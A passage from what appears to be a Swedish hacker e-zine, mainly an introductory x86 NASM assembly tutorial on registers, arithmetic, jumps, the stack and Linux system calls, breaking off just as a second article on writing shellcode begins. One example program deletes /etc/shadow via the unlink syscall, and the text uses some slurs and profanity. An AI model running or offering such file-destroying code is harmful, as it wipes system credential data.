+    hello_world.o: Den objektsfil vi vill göra ett program av
+
+Om allt gått bra nu bör vi ha en körbar programfil som heter hello i samma
+katalog. nasm bör skapa en körbar programfil med x-flaggan satt, men om så inte
+är fallet, kör:
+$ chmod u+x hello
+för att märka hello som körbar. Låt oss kontrollera:
+
+$ ls -lah hello
+-rwxr-xr-x 1 scmc scmc 508 29 Nov 13.26 hello
+
+Att det fjärde tecknet från vänster är ett x betyder att ägaren av filen 
+(användaren scmc i det här fallet) kan köra den. Vi ser också att vårt program
+har en storlek på 508 byte, vilket kan tyckas vara litet. I själva verket är
+storleken på själva maskinkoden endast 22 byte, och storleken på vår data 14 
+byte. Resten är headers och information för ELF-loadern samt padding och 
+liknande.
+
+Låt oss köra vårt program och kolla vilken exit/error code den ger:
+
+$ ./hello ; echo $?
+Hello, World!
+88
+
+Fungerar finfint :) Har du nu följt med såhär långt så har du skapat ditt första
+assemblerprogram.
+
+Uppbyggnaden av en instruktion
+------------------------------
+Själva assemblerkoden är uppbyggd av instruktioner. En instruktion består utav
+en sk. mnemonic (minnesord på svenska) som anger vilken instruktion det är 
+frågan om, samt eventuella operander som instruktionen ska verka på/mot. I 
+hello world exemplet tidigare finner vi följande instruktion:
+
+mov	ebx, eax
+
+Där är mov minnesordet och eax samt ebx operander. Här har vi också fallet
+där vi har en källoperand och en måloperand. I NASM-syntax (ursprungligen 
+intel-syntax) kommer måloperanden först, sen källoperanden. Eller på engelska:
+
+mov	dest, src
+
+Detta översätts sedan direkt till maskinkod, en massa ettor och nollor som
+processorn kan förstå.
+
+Register, minne och omedelbara värden
+-------------------------------------
+Så, vad är det här med eax och ebx? eax och ebx är två sk. register, 
+minnesplatser innuti själva processorn. De har en fast storlek på 32 bitar och
+är såkallade "general purpose" register. Se det som variabler som kan hålla 32
+bitar.
+
+Det finns sex GP register som vi behöver bry oss om. Man kan även komma åt de 
+lägre 16 bitarna på samtliga och de lägre och högre 8 bitarna av de lägre 16 
+bitarna för sig på fyra av dem.
+
+32-bitar       16-bitar       8-bitar
+  eax             ax           ah,al (a high, a low)
+  ebx             bx           bh,bl
+  ecx             cx           ch,cl
+  edx             dx           dh,dl
+  esi             si             -
+  edi             di             -
+
+Det är de register vi behöver bry oss om just nu. De har olika namn och används
+på olika sätt hos vissa instruktioner, men det ligger lite längre fram. Låt oss
+gå tillbaka till vår gamla kamrat mov:
+
+mov	ebx, eax
+
+Vad vi gör här är alltså att flytta innehållet från källoperanden (eax i det 
+här fallet) till måloperanden (ebx).
+
+Vi kan även använda minnet för att lagra data i. Nackdelen med det är att 
+minnesåtkomst är långsammare än registeråtkomst. Fördelen är att det ger oss 
+mer utrymme än vad 6 stycken 32-bitarsregister har att erbjuda. Minnet anges
+med adressen till den plats vi vill använda eller med namnet på den etikett vi
+använder i vår källkod för att referera till en viss plats. Det namnet översätts
+sen till en adress vid assemblering.
+
+Om vi ska hämta ett värde från en minnesadress måste vi avreferera adressen.
+Skriver vi:
+
+mov	ebx, memAddr
+
+lägger vi bara adressen till vårt värde i ebx. Det kanske är det vi vill, men
+om vi vill hämta värdet avrefererar vi med hakparenteser:
+
+mov     ebx, [memAddr]
+
+Då hamnar värdet vid memAddr i registret ebx. Likadant om vi vill spara värdet
+som ligger i ebx till minnespositionen memAddr, så skriver vi:
+
+mov     [memAddr], ebx
+
+Och då har vi omedelbara värden kvar. Detta är värden som följer instruktionen
+i koden. Skulle vi vilja lägga värdet 10 i registret al skriver vi:
+
+mov     al, 10
+
+Matte
+-----
+En dator är i grund och botten en räknemaskin så för att utveckla våra 
+färdigheter i assemblerprogrammering kommer vi nu lära oss att räkna. Vi börjar
+med de fyra grundläggande räknesätten. Addition, subtraktion, multiplikation 
+samt division. Eller i assembler: add, sub, (i)mul samt (i)div. Skillnaden 
+mellan imul och mul samt idiv och div är att i*-instruktionerna arbetar på
+sk. signed integers, det vill säga heltal som genom komplement kan 
+representera negativa tal. Eftersom målet med denna introduktionsartikel är att
+sätta in dig som läsare i assemblerprogrammering så skippar jag vidare 
+förklaringar och hoppas på att du hade en schysst matte-/programmeringslärare i
+skolan som lärde dig binär matte. Jag kommer inte att gå in vidare på 
+imul och idiv, utan passar bara på att nämna dem.
+
+Dessa fyra instruktioner arbetar mot heltal, flyttalsaritmetik sköts av andra
+instruktioner och med andra register än de jag hittils nämnt.
+
+Nej, för mycket negativt struntprat. Låt oss gå in på instruktionerna:
+
+add     dest, src
+  Adderar den första operanden med den andra och lägger resultatet i 
+  måloperanden. Måloperanden kan vara ett register (8, 16 eller 32-bitars) eller
+  en minnesplats. Källoperanden kan antingen vara ett register, en minnesplats
+  eller ett omedelbart värde.
+  ex:
+    mov     al, 10  ; lagrar värdet 10 i al-registret
+    add     al, 7   ; adderar innehållet i al registret (10) med 7; al 
+                    ; innehåller nu värdet 17
+    mov     [x], al ; lagrar värdet 17 vid minnesadressen x, tidigare deklarerad
+                    ; med: x db 0
+
+sub     dest, src
+  Subtraherar dest med src och lägger resultatet i dest. dest kan vara ett
+  register eller en minnesplats. src kan vara ett register, en minnesplats eller
+  ett omedelbart värde.
+  ex:
+    xor     eax,eax ; exklusiv ELLER på två likadana tal ger 0, tömmer eax mao. 
+                    ; Samma resultat som mov eax, 0 fast mindre och snabbare
+    add     eax, 70 ; eax = 0+70
+    sub     eax, 10 ; eax = 70-10, eax håller nu värdet 60
+
+mul     src
+  Multiplicerar måloperanden eax, ax eller al med källoperanden (src). Vilket 
+  register som fungerar som måloperand avgörs av storleken på källoperanden.
+  Källoperanden är antingen ett register eller en minnesplats. Om källoperanden
+  är 8 bitar (byte) stor läggs resultatet av multiplikationen i ax. Är 
+  källoperanden 16 bitar stor (word) läggs resultatet i dx:ax (där dx håller
+  de övre 16 bitarna och ax de lägre 16 bitarna). Är källoperanden 32 bitar stor
+  (dword) läggs resultatet i edx:eax.
+  ex:
+    mov     al, 200
+    mov     ah, 200
+    mul     ah       ; 200*200=40000, hamnar i ax registret
+
+div     src
+  Dividerar värdet i ax, dx:ax eller edx:eax (täljaren) med källoperanden (som
+  då är nämnaren). Källoperanden kan vara ett register eller en minnesplats. Om
+  källoperanden är en byte stor hamnar kvoten i al och rest(en) i ah. Om 
+  källoperanden är ett word hamnar kvoten i ax och resten i dx. Om 
+  källoperanden är ett dword hamnar kvoten i eax och resten i edx. 
+  ex:
+    xor     dx, dx   ; töm dx
+    mov     cx, 20   ; cx (nämnaren) sätts till 20
+    mov     ax, 45   ; ax (täljaren) sätts till 45
+    div     cx       ; 45/20 = kvot i ax: 2 rest i dx: 5
+
+Övning ger färdighet. Ser det svårt ut nu, lek lite med det. Dags för ett nytt
+assemblerprogram att ha kul med. 
+
+---- KOD
+BITS 32
+GLOBAL _start
+
+section .text
+_start:
+	;; Do some calculations
+	mov	eax, 12
+	add	eax, 8		;eax=20, eftersom al är en del av eax som håller
+	                        ;de lägre 8 bitarna (möjliga värden 0-255) är
+	                        ;även al=20
+	mov     ah, 20
+	mul	ah		;20*20=400, finns nu i ax
+	sub	ax, 150		;ax (och al)=250
+	mov	dl, 10
+	div	dl		;250/10=25, finns i al
+	add	al, 5		;al := 25+5=30
+
+	;; exit with the exit code stored in ax, which should be 30
+	xor	ebx,ebx
+	mov	bl, al
+	mov	eax, 1
+	int	0x80
+---- KOD
+
+Om du kompilerar ovanstående kod enligt tidigare direktiv och kollar exit code
+(som i bash och de flesta andra skal hamnar i variablen ?) bör det vara 30.
+Det är det för mig i alla fall. Testa att ändra värden, lägga till instruktioner
+kompilera och se vad som händer.
+
+Det är två saker som behövs förtydligas nu. Om jag inte var tillräckligt tydlig
+tidigare, så är al en del av ax, som är en del av eax, och lika så är dl en
+del av dx, som är en del av edx.
+
+Det andra som bör förtyligas är hur vi har avslutat våra två program hittils.
+Först har vi lagt värdet 1 i eax, sen har vi lagt vår exit code i ebx. Därefter
+följer instruktionen "int 0x80". Vad den gör är att generera en interrupt, en
+asynkron händelse. Just interrupt 0x80 (128 decimalt) används för systemanrop,
+funktioner i operativsystemskärnan. Mer om detta i ett senare skede. Allt du 
+behöver veta just nu är att eax håller systemanropsnummret, 1 motsvarar _exit().
+ebx håller argumentet, vår exit code. Se int 0x80 som en typ av funktionsanrop.
+
+Förutom vanlig grundskolematte finns det logiska operationer, boolesk algebra.
+Det finns även instruktioner för att manipulera registerinnehåll på en binär 
+nivå. Det finns ganska mycket mer än så. Flyttal och instruktioner för att 
+hantera dem t.ex. Jag har valt att inte gå in mer på det än att nämna att det 
+finns.
+
+Programflöde
+------------
+Att ha ett program där programflödet går i en rak linje (tråd) utan att ha
+någon form av valbar exekvering, "om det här registret har det värdet, gör så",
+eller iterativa satser. Ett program utan iterativa satser skulle vara ganska
+gay, då hade all kod som skulle upprepas få upprepats på maskinkodsnivå, ganska
+ineffektivt. 
+
+Så, det är därför vi har instruktioner för att kunna iterera över kod, anropa
+subrutiner och endast köra viss kod när ett visst tillstånd existerar. 
+
+Processorn har ett register vars uppgift är att markera vissa tillstånd. Detta
+register kallas för EFLAGS. När vi testar efter ett visst tillstånd med någon
+av de testinstruktioner jag kommer att introducera snart så ändras vissa
+flaggor i detta register. Flaggor är enskilda bitar i ett bitfält, i detta fall
+enskilda bitar i ett register. De flaggor som vi kommer att fokusera på är:
+
+CF: Carry Flag, håller rest. Kan också användas för att signalera fel
+ZF: Zero Flag, sätts av vissa instruktioner när deras resultat är 0 (sub t.ex.)
+               sätts till 0 om så inte är fallet.
+SF: Signed Flag, sätts av vissa instruktioner till 1 när de resulterar i ett 
+                 negativt värde. Sätts till 0 annars.
+OF: Overflow Flag, sätts till 1 om resultatet av en instruktion är större än
+                   eller mindre än storleken på måloperanden. Sätts till 0 om 
+                   så inte är fallet.
+
+Det finns även andra flaggor, men de behöver vi inte kunna nu. Viktigt att komma
+ihåg är att det inte är alla instruktioner som modifierar EFLAGS. Vilka 
+instruktioner som modifierar vilka flaggor och liknande kan du läsa mer om i 
+intels referensmanual för x86-plattformen.
+
+Hur gör vi för att testa vissa tillstånd? Om vi vill veta att eax är 0, hur
+gör vi då? Låt mig introducera två nya instruktioner, cmp och test.
+
+cmp     dest, src
+  cmp subtraherar dest med src, _UTAN_ att spara resultatet i dest. Vi påverkar
+  alltså inte innehållet i målopranden. sub och cmp ändrar däremot båda EFLAGS.
+  ex:
+    mov     al, 10
+    cmp     al, 10  ; 10-10=0, ZF sätts till 1
+
+  ex 2:
+    xor     eax,eax
+    cmp     eax, 10 ; 0-10=-10, SF sätts till 1
+
+test     dest, src
+  utför en logisk OCH operation mellan src och dst _UTAN_ att spara resultatet
+  i målregistret. Används ofta för att testa mot 0, då cmp reg, 0 är både större
+  och långsammare än test reg, reg.
+  ex:
+    xor     eax,eax  ; eax = 0
+    test    eax, eax ; 0 & 0 blir 0, ZF sätts till 1
+
+Nu vet vi testar efter vissa tillstånd, men hur kan vi göra något praktiskt av
+dem? Hur kan vi säga: "om ZF är satt, gör det här"? Det är här sk. 
+"conditional jumps" kommer in i bilden. De hoppar till en viss position i koden
+endast om ett tillstånd uppfylls. 
+
+Det finns några stycken conditional jumps, jag kommer presentera de vanligaste.
+Jag rekommenderar dig att kolla upp de andra när du känner dig lite mer säker
+på assemblerprogrammering.
+    
+jz/je      rel_addr : Hoppar till rel_addr (relativ adress) om ZF är 1
+                      jz är kort för Jump if Zero, je är kort för Jump if Equal
+jnz/jne    rel_addr : Hoppar till rel_addr om ZF är 1, kort för Jump if Not 
+                      Zero/Equal
+js         rel_addr : Hoppar till rel_addr om SF är 1, Jump if Signed
+jns        rel_addr : Hoppar till rel_addr om SF är 0, Jump if Not Signed
+ja         rel_addr : Hoppar till rel_addr om CF och ZF båda är 0, kort för
+                      Jump if Above
+jb         rel_addr : Hoppar till rel_addr om CF är 1, kort för Jump if Below
+
+ja och jb följer oftast cmp, men används inte så ofta som man kan tro. Ett annat
+sätt att förflytta sig (hoppa) i koden är med jmp:
+
+jmp     addr
+  hoppar till addr
+
+Inga tester eller någonting.
+
+ex:
+  mov     ch, 99
+  cmp     ch, 100    ; 99-100, SF sätts till 1
+  js      hoppaHit   ; SF är 1, vi kommer att hoppa till adressen som märks med
+                     ; ettiketten "hoppaHit"
+ex 2:
+  xor     eax, eax   ; xor är en av de operationer som, trots att de inte är 
+                     ; rena testoperationer, modifierar vissa flaggor i EFLAGS
+  jz      hoppaHit   ; eax xor eax = 0, vi kommer att koppa till hoppaHit
+
+ex 3:
+  xor     eax, eax
+  jnz     hoppaHit   ; Från det tidigare exemplet vet vi att ZF=1, så det här
+                     ; hoppet kommer _inte_ att tas
+
+utifrån dessa instruktioner kan man bygga saker man känner igen från andra 
+språk; if-satser, while loopar osv. Lite exempel på det:
+
+ex
+  C-kod:
+    int var = 30-3;
+    if (var == 27) {
+        var = 0;
+    } else {
+        var = 27;
+    }
+
+  asm-kod: (vi kommer att låta var representeras av eax)
+  
+    mov     eax, 30
+    sub     eax, 3   ; en icke-dumihuet C-kompilator sätter eax till 27 direkt
+    cmp     eax, 27
+    jz      resetEax
+    mov     eax, 27
+    jmp     end
+  resetEax:
+    xor     eax, eax
+  end:
+
+I ovanstående kod ser vi ett exempel på hur if-satser i C kan översättas till
+assembler. Hur fungerar det med loopar då? Låt oss ta en enkel while loop som
+exempel:
+
+ex:
+  C-kod:
+    int j=0;
+    for(int i=0; i<32; i++) {
+      j++;
+    }
+
+  asm-kod:
+    xor     eax,eax  ; j
+    xor     ecx,ecx  ; i
+    mov     cl, 0
+  .loop:
+    inc     eax
+    inc     ecx
+    cmp     ecx, 32
+    jb      .loop
+
+Fast det finns en finare instruktion för detta:
+
+loop     rel_addr
+  minskar värdet på cx och hoppar till rel_addr så länge värdet är större än 0.
+
+Med loop kan vår kod skrivas om till:
+
+  asm-kod:
+    xor     eax,eax
+    xor     ecx,ecx
+    mov     cl, 32
+  .loop:
+    inc     eax
+    loop    .loop
+
+När jag säger finare menar jag mindre, loop är desvärre långsammare än en 
+dec/jnz (dec sätter ZF till 1 om det den minskar blir 0). Så v3.0 av vår kod
+blir:
+
+  asm-kod:
+    xor     eax,eax
+    xor     ecx,ecx
+    mov     cl, 31
+  .loop:
+    inc     eax
+    dec     cl
+    jnz     .loop
+
+Notera att vi går baklänges, att testa efter < 32 är "jobbigare" än att testa 
+efter 0 eftersom vi använder ett omedelbart värde i det förstnämnda.
+
+Stacken och subrutiner
+----------------------
+Har du sysslat med datastrukturer i andra språk än assembler, eller på ett 
+teoretiskt stadium, så vet du antagligen vad en stack är. För er som inte vet
+vad det är följer en förklaring.
+
+En stack är en datastruktur. En datastruktur är ett sätt att lagra data så att
+det kan hanteras enligt vissa algoritmer. En stack är en LIFO-struktur, det 
+vill säga att det sista man lagrar är det första man hämtar från den, därav
+namnet Last In, First Out.
+
+Man brukar visualisera en stack som en trave tallrikar. Den sista tallriken man
+lägger på traven är den första någon kommer att ta när de behöver en, förutsatt
+att man lägger dit en tallrik åt gången. 
+
+Att lägga till en tallrik på traven kallas för push. Att ta en tallrik kallas
+för pop. Observera:
+ 
++----------------+  <--- 0x2000
+|                |
++----------------+
+|                |
++----------------+
+|                |
++----------------+
+|                |
++----------------+  <--- 0x1ff0 
+
+Såhär ser en visualisering av vår programstack ut. Varje process har en egen
+stack. De hexadecimala tal som står höger om det som föreställer själva stacken
+är påhittade minnesadresser. De stämmer inte med verkligheten, men de står med
+för att visa att _stacken växer neråt_! Se det som att tallrikarna har blivit
+sovande fladdermöss och hänger i varandra, och när en ny fladdermus vill sova
+klamrar han sig fast i öronen på den som hänger längst ner. Skulle vi pusha
+ett nytt värde på vår stack skulle det se ut såhär:
+
++----------------+  <--- 0x2000
+|                |
++----------------+
+|                |
++----------------+
+|                |
++----------------+
+|                |
++----------------+  <--- 0x1ff0 
+|   NYTT VÄRDE   |
++----------------+  <--- 0x1fec
+
+Skulle vi poppa ett värde skulle det se ut som figuren innan denna.
+
+Alla värden som läggs på stacken är fyra byte om den används rätt. Men hur
+håller vi koll på den adress där vårt sista element befinner sig? Den ändrar
+sig ju hela tiden när man lägger till och tar bort element.
+
+Möt esp, Stack Pointer. Detta register håller adressen till det översta 
+stackelementet (som är underst eftersom stacken växer neråt, tänk på 
+fladdermössen). Vill vi lägga till ett värde på stacken kan vi alltså skriva:
+
+  mov     eax, 0x7fc21100     ; vilket värde som helst
+  sub     esp, 4              ; gör plats för ett stackelement, stacken växer 
+                              ; neråt.
+  mov     [esp], eax          ; flytta innehållet i eax till den adress esp 
+                              ; anger
+
+sub esp, 4 går på 6 byte och mov [esp], eax går på 3 byte. Wohoo, 9 byte. 
+Slöseri med minne eller nödvändigt ont? Slöseri med minne, det finns nämligen
+en instruktion som motsvarar vår sub/mov kombination, och den heter push!
+
+push     src
+  Lägger till src (som kan vara minne, register eller ett omedelbart värde)
+  på stacken. Pushar man ett register är det endast 1 byte stort!
+
+Skulle vi skriva push [someMem] skulle nasm inte veta om vi vill pusha en byte
+ett word eller ett dword. Register är har ju en fast storlek, men inte minnet.
+Därför måste vi förtydliga detta genom att ange storlek, ex: 
+
+  push dword [someMem]
+
+Lika så, vill vi hämta det översta värdet på stacken kan vi skriva:
+
+  mov     eax, [esp]
+  add     esp, 4      
+
+Eller så kan vi skriva:
+
+  pop     eax
+
+pop     dest
+  Lägger översta stackelementet till dest. Dest kan vara minne eller register.
+
+Vad har man då för nytta utav stacken? Är det bara onödig kunskap eller kan
+man göra något med den?
+
+Stacken kan användas för att skicka parametrar till och från subrutiner. 
+Eftersom x86 har ganska få register i sitt grundutförande och några inte går
+att använda eftersom de håller koll på annat (ex: esp håller koll på stacken)
+måste minnet användas för att skicka parametrar mellan olika delar av 
+programmet.
+
+Funktioner används för att dela upp programmet i mindre enheter (faktorisera)
+för att  underlätta återanvändning av kod, programunderhåll och portning till
+andra system. Man separerar logiska enheter och gör projektet mer överskådligt.
+Det skapar lite bloat för maskinen, men underlättar mycket för programmeraren. 
+Och vad är ett par klockcykler när man har en 3 GHz quad core processor? Inte
+för att jag har det, så jag bryr mig fortfarande.
+
+Som ett exempel. För att undvika att varje gång ta reda på längden av en 
+nul-terminerad sträng genom diverse instruktioner är allt vi behöver göra
+att anropa en funktion, strlen.
+
+---- KOD
+BITS 32
+GLOBAL main
+EXTERN strlen
+
+section .data
+strFuck db 'War, fuck the system!',0
+
+section .text
+main:
+        push    dword strFuck   ;Lägg adressen till vår sträng på stacken
+        call    strlen
+        add     esp, 4
+
+        ;; put strlen return as an exit code for exit
+        mov     ebx,eax
+        mov     eax,1
+        int     0x80     
+---- KOD
+
+Nu använder vi en biblioteksfunktion, så nu måste vi tala om för ld att vi vill
+importera funktioner från ett bibliotek. Det gör vi med -l flaggan. Så:
+
+$ nasm -felf strlen.asm
+$ gcc -o wie strlen.o
+$ ./wie ; echo $?
+21
+
+Som vi ser här lägger vi adressen till vår sträng på stacken, anropar strlen
+(som vi måste ha deklarerat som en EXTERN symbol, den finns i C biblioteket). 
+Så långt är det ganska klart. Varför ökar vi stackpekaren med 4?
+
+Det finns vissa standarder man måste följa, C-funktioner (dock inte i windows 
+bibliotek) har det bestämt så att den som anropar funktionen är ansvarig för att
+hålla reda på stacken. Så, det vi gör när vi ökar stackpekaren med fyra är helt
+enkelt att "ta bort" adressen till vår sträng. Den finns fortfarande kvar, men
+den kommer att skrivas över vid nästa push.
+
+Det värde en funktion returnerar hamnar i eax, därav att vi flyttar värdet från
+eax till ebx när vi ska avsluta. Varför vi gör det behandlas i kapitlet om 
+systemanrop som kommer efter detta kapitel.
+
+Nu vet du hur man anropar en funktion, men hur skriver man en då? Låt oss göra
+en egen strlen:
+
+---- KOD
+BITS 32
+GLOBAL _start
+
+section .data
+strFuck db 'War, fuck the system!',0
+
+section .text
+_start: 
+        push    dword strFuck   ;Lägg adressen till vår sträng på stacken
+        call    strlen
+        add     esp, 4
+
+        mov     ebx,eax
+        mov     eax,1
+        int     0x80
+
+strlen:
+        push    ebp             ; spara gammalt värde av ebp
+        mov     ebp, esp        ; lägg aktuell stack addr i ebp
+        mov     esi, [ebp+8]    ;esi = addressen till vår sträng
+        xor     ecx, ecx        ;ecx = längd av sträng
+        cld                     ; DF = 0, öka esi vid lodsb
+
+.loop:
+        lodsb                   ; lägg den byte esi har adressen till i al och
+                                ; öka esi med 1  
+        test    al, al     
+        jz      .end_loop       ; Hoppa till slutet om al == nul-byte
+        inc     ecx             ; öka ecx med 1
+        jmp     .loop           ; ta nästa byte
+        
+.end_loop:
+        mov     eax, ecx        ; Flytta längden av strängen till eax
+        pop     ebp             ; Flytta tillbaka det lagrade värdet av ebp 
+        ret                     ; ta en dword från stacken och hoppa dit
+---- KOD
+
+ebp, huh? ebp är ett register som används ihop med stacken, kallas Base Pointer.
+Man brukar ge den adresser till stacken för fasta referenser, så att man kan få
+ut adressen till stackvariabler och funktionsargument. Stackpekaren kan ändras
+men ebp har samma värde genom en hel funktion. Jag satte bara upp det här för 
+att demonstrera hur det används, det behövs inte egentligen i vårt fall.
+
+Så, skalet till en funktion är att spara gamla värdet av ebp, flytta
+värdet på stackpekaren till ebp, göra lite saker, flytta tillbala värdet av ebp
+från stacken och sen köra instruktionen ret. Men vad gör ret egentligen? Vad
+gör call?
+
+call (som ni antagligen har märkt att vi anropat funktioner med) lägger värdet
+av eip (ett register som håller adressen till nästa instruktion, vi kan inte
+manipulera den direkt med mov och liknande) på stacken och hoppar till den
+adress vi ger, i vårt fall strlen.
+
+ret tar elementet överts på stacken (väldigt viktigt att se till att det är 
+samma värde som gavs av call, annars hoppar vi till okända marker) och
+hoppar till det.
+
+Systemanrop i Linux
+-------------------
+Vad är instruktionen för att upprätta en nätverksanslutning i Linux? Någon?
+Ingen?
+
+Det var något av en kuggfråga, det finns ingen sådan instruktion. Istället är
+man beroende av Linuxkärnan, som tillhandahåller den tjänsten för applikationer
+och skyddar oss från att interagera direkt med nätverkskortet. För att inte tala
+om att spara oss den mödan att behöva skriva en drivrutin och implementera en 
+nätverksstack i varje program vi skriver som behöver någon form av 
+nätverksfunktionalitet. En stor fördel med operativsystem. Dessa funktioner 
+kallas för systemfunktioner, och man anropar dem med systemanrop.
+
+Vi har faktiskt redan använt systemanrop. Hur tror du annars vi har avslutat
+våra processer? That's right. När vi satt eax till 1 och aktiverat interupt 0x80
+så har vi anropat systemfunktionen exit, _exit() i libc. Och då kanske du redan
+fått en uppfattning om hur det går till.
+
+Varje systemanrop har ett nummer. exit har nummer ett, write har nummer fyra.
+Vilket nummer ett givet systemanrop har kan man hitta i filen 
+/usr/include/asm/unistd.h. Där finns alla syscall nummer definierade enligt
+följande format:
+
+#define __NR_<syscall>              <syscall_nr>
+
+Så om vi vill veta vad systemanropet unlink har för nummer kan vi göra följande:
+
+$ grep __NR_unlink /usr/include/asm/unistd.h 
+#define __NR_unlink              10
+#define __NR_unlinkat           301
+
+Se där, nummer tio. Planerar du på att programmera i assembler mycket gör du
+klokt i att konvertera alla dessa defines till NASM format. Ett sätt att göra
+detta på är att skriva in följande i skalet:
+
+cat /usr/include/asm/unistd.h | perl -nle '/__NR_(\S+)\s+(\d+)/ or next; \
+        print "%define SCALL_$1\t\t$2"'
+
+Ett litet hopkok bara, vill du göra en seriösare parser kan du använda spaces
+istället för tabs, och göra det möjligt att parsa syscalls definierade relativt
+till andra syscalls. Varför inte skriva ihop en h2inc (inc är normalt
+den filändelse man ger asm headers, .h används av GNU's assembler) i assembler
+när vi ändå är igång?
+
+Phew, vi spåra nästan ur där. "Det är assembler, inte Perl". Okej. Så varje
+systemanrop har ett nummer. Det första vi gör är att se till att eax får
+värdet av detta nummer. Sen kommer vi till argumenten.
+
+Till skillnad från vanliga C-aktiga funktioner får systemanrop sina argument via
+register, enligt följande tabell:
+
+1'a arg: ebx
+2'a arg: ecx
+3'e arg: edx
+4'e arg: esi
+5'e arg: edi
+6'e arg: ebp
+
+Hur vet vi hur många argument en systemfunktion har då? Det står ju inte i 
+headerfilen. Nej, det gör det inte. Den informationen hittar vi istället i 
+manualen. Sektion 2 av manualen innehåller dokumentation om systemanrop. Så,
+för att kolla upp ett visst systemanrop skriver vi:
+
+man 2 <namn>
+
+t.ex: 
+
+man 2 unlink
+
+Där ser vi att unlink har ett argument, en nul-sträng till den fil vi vill ta
+bort. Dags för ett litet program igen:
+
+---- KOD
+
+BITS 32
+GLOBAL _start
+
+section .data
+fname:      db '/etc/shadow',0
+
+section .text
+_start:
+     ;; call unlink("/etc/shadow");
+     mov     eax, 10
+     mov     ebx, fname
+     int     0x80
+
+     ;; call _exit(0);
+     mov     eax, 1
+     xor     ebx,ebx
+     int     0x80
+
+---- KOD
+
+Där har vi ett program vars enda syfte är att ta bort /etc/shadow. En 
+rekommendation från min sida är att ändra filnamn om ni vill köra programmet 
+öht.
+
+Vi har två saker kvar, själva anropet och returvärdet. Anropet sker med
+hjälp av en sk. interrupt. Interrupts bryter det normala programflödet och 
+anropar en funktion given i vad som kallas IDT, Interrupt Descriptor Table.
+Se det som en asynkron händelse. Men det är överkurs, intterupts används bara 
+i Linux för syscalls (den delen av Linux vi ser iaf). Så, int 0x80 fungerar
+ungefär som call rent praktiskt med det undantaget att vi istället för en
+adress anger interruptnummer och argumenten läggs i register. Systemanrop är
+dessutom kod i själva kärnan, det magiska ring 0, fulla rättigheter. Det är
+också överkurs.
+
+Det finns ett annat sätt att göra systemanrop förutsatt att du har en 2.6 kärna
+eller högre, och en processor som stödjer instruktionen syscall. Eftersom
+interrupts är långsamma på nyare datorer föreslår jag att du kollar upp detta
+om du ska skriva en applikation där många systemanrop görs och där prestanda
+är viktigt. Du måste parse'a ELFs auxiliary vectors som läggs på stacken av
+ELF loadern för att frå adressen till en wrapper för sysenter som 
+tillhandahåller de operander som behövs. Det är definitivt överkurs för en
+introduktionsartikel.
+
+Returvärden fungerar på samma sätt som funktionsanrop i C, returvärdet läggs i
+eax.
+
+För de icke-övertygade
+----------------------
+För er som inte tror mig när jag säger att assembler är överlägset även 
+moderna C kompilatorer, betrakta följande:
+
+$ cat test.c
+void test()
+{
+    int i = 4;
+    while (i > 0) {
+        i--;
+    }
+}
+
+
+En C funktion som initierar en variabel till 4 och räknar ner den till 0.
+Låt oss kompilera med gcc version 4.1.1:
+
+$ gcc -c test.c
+$ ld -o test --oformat binary test.o
+
+Nu har vi den råa maskinkoden i filen test. Vi kan inte köra den eftersom vi 
+inte har en loader för rå maskinkod, men vi kan titta på den. Låt oss köra den 
+genom en disassembler (vi hade kunnat be om asm-output från början genom att ge
+gcc flaggan -S, men då hade vi fått det i AT&T syntax, bleh :\ ):
+
+$ ndisasm -b32 test
+00000000  55                push ebp
+00000001  89E5              mov ebp,esp
+00000003  83EC10            sub esp,byte +0x10
+00000006  C745FC04000000    mov dword [ebp-0x4],0x4
+0000000D  EB03              jmp short 0x12
+0000000F  FF4DFC            dec dword [ebp-0x4]
+00000012  837DFC00          cmp dword [ebp-0x4],byte +0x0
+00000016  7FF7              jg 0xf
+00000018  C9                leave
+00000019  C3                ret
+
+För er som aldrig använd ndisasm förr, så är det första fältet offset, det andra
+är maskinkoden i hexadecimalt och det tredje är assemblerinstruktionen.
+26 byte stor. En rolig notis om detta är att om vi kör med optimeringsflagga 2
+när vi kompilerar blir funktionen bara 5 byte stor, men då gör den inget heller.
+gcc är smart nog att se att funktionen inte påverkar programmets tillstånd och
+optimerar bort innehållet, men behåller funktionsskalet.
+
+Så, 26 byte. Det är ju jävligt onödigt att använda stacken öht. Vi som 
+programmerare vet om vilka register som kommer att användas, när vi skriver
+våra applikationer i assembler, i.e. Så vi kan ju förutsätta att eax och ecx
+kan användas. Då kan vi skriva om den till:
+
+  _test:
+    mov       al, 4
+    jmp       .cmp_jmp
+  .dec_loop:
+    dec       al
+  .cmp_jmp:
+    cmp       al,byte 0
+    jg        dec_loop
+    ret
+
+Stor förbättring. Fast det går att göra bättre. dec modifierar ju ZF i EFLAGS, 
+så cmp'n behöver vi ju inte. Vi kan skriva om test såhär:
+
+  _test:
+    mov       al, 5
+  .loop:
+    dec       al
+    jnz       .loop
+    ret
+
+Okej, jag fuskade lite. Funktionaliteten är densamma, men ovanstående skulle
+motsvara något i stil med:
+
+  int i = 5;
+  do {
+    i--;
+  } while (i != 0);
+
+Som för övrigt blir 24 byte. Skit samma, det är resultatet vi är ute efter. Och
+vad blir det?
+
+$ nasm -fbin test.asm && ls -la test | awk '{print $5}'
+7
+
+Bara sju byte! Så, eftersom vi som programmerare har större kontroll än vad en
+kompilator har (den är bunden till formaliserade regler och standarder, vi
+kan hacka loss) kommer assembler, i händerna på en god programmerare, alltid
+generera mindre och snabbare kod än ett HLL-språk. Sen kommer det antagligen
+ta längre tid att koda och kräva längre tid att avlusa, men det är en annan 
+femma.
+
+Länkar
+------
+
+Mycket bra, fri och gratis bok om assembler för Linux:
+  http://drpaulcarter.com/pcasm/
+
+instruktionsset för Pentium 4, inklusive flyttal, SIMD instruktioner och allt
+annat mumsigt som bara går att köra på nya datorer:
+  ftp://download.intel.com/design/Pentium4/manuals/25366621.pdf
+  ftp://download.intel.com/design/Pentium4/manuals/25366721.pdf
+
+===============================================================================
+0x07 Skalkod för glädje och profit!
+===============================================================================
+Av: Profeten
+
+Okej, vi ska i den här guiden kolla igenom vad shellcode är och hur du kan lära
+dig att skriva shellcode. Faktum är att du egentligen inte kommer behöva något
+direkta kunskaper för att klara av den här guiden utan mest att du kommer behöva
+huvudet på skafft och veta lite grunder i programmering och kanske lite *NIX.
+
+För det första ska jag presentera en liden kod här som vi kommer använda oss
+utav för att bla. testa våran shellcode. Den ser ut som följande:
+
+Notera: att jag nu självklart pratar om ett x86 system dvs. att detta inte är
+likadant på andra CPU arkitekturer!
+
+/* skalkod.c 
+
+Använd: gcc skalkod.c -o skalkod
+
+*/
+#include <stdio.h>
